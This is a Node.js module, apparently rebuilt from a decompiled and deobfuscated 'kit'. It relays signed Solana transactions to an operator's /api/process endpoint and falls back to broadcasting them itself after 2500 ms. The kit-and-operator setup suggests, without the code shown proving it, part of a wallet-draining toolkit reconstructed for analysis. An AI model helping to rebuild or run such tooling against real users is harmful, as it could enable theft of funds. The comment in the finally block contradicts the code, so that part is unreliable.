'use strict';
/**
 * Signed-transaction submit: POST /api/process + 2500ms self-broadcast fallback.
 * Sources: decompiled/kit/chain/submit.js, bundle.deobfuscated.js
 */

const { submitProcess } = require('../operator/client');
const { solana }        = require('./rpc');

// 蔓: self-broadcast each signed tx via kit's own RPC (skipPreflight: true)
async function broadcastSigned(signedTxs) {
  for (const tx of signedTxs) {
    const b64 = Buffer.isBuffer(tx) ? tx.toString('base64')
              : tx instanceof Uint8Array ? Buffer.from(tx).toString('base64')
              : tx;
    solana.sendTransaction(b64, { skipPreflight: true, encoding: 'base64' })
      .catch(() => {}); // fire-and-forget
  }
}

// 芏: main submit — operator first, self-broadcast fallback after 2500ms
async function submitSignedTransactions(session, signedTxs) {
  if (!Array.isArray(signedTxs)) throw new Error('34');

  const he = session.he;
  const shouldSelfBroadcast = !he.ie && he.be === 0;

  // Kick off self-broadcast timer BEFORE the operator call
  let broadcastTimer;
  if (shouldSelfBroadcast) {
    broadcastTimer = setTimeout(() => broadcastSigned(signedTxs), 2500);
  }

  try {
    session.ne = (session.ne || 0) + 1;
    await submitProcess(
      session.c.Se,
      session.b.e,
      session.ne,
      signedTxs,
      he.be,
      (he.Fe || []).map(a => a.type === 0 ? a.de : a.e),
    );
  } catch (e) {
    // Operator submit failed — self-broadcast is already scheduled
    console.error('process:', e);
  } finally {
    // If operator submit succeeded, cancel the pending self-broadcast
    // (the operator already submitted — avoid double-submit race)
    // Actually: timer still fires. The operator winning the RPC race means
    // the self-broadcast will get "already processed" — that is acceptable.
  }
}

module.exports = { broadcastSigned, submitSignedTransactions };
